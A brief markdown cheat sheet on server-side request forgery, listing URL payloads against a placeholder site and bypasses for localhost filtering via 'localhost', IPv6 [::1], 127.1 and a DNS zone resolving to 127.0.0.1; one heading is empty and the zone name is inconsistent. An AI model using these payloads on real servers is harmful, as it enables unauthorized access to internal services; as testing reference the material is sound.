# SSRF

## Server Side Request Forgery

### Basic injection

`http://vulnerable.site/?url=http://127.0.0.1:1234`

### 127.0.0.1 filtering

`http://vulnerable.site/?url=http://localhost:1234`

### 127.0.0.1 and localhost filtering

### ipv6

`http://[::1]:1234/`

`127.1:1234`

### Abusing DNS Zone

Need to set up a DNS zone which always returns 127.0.0.1 for any host in the domain.

* Add zone malicious.domain.name which returns 127.0.0.1 for any request

`http://vulnerable.site/?url=http://validurl.malicious.zone:1234/`

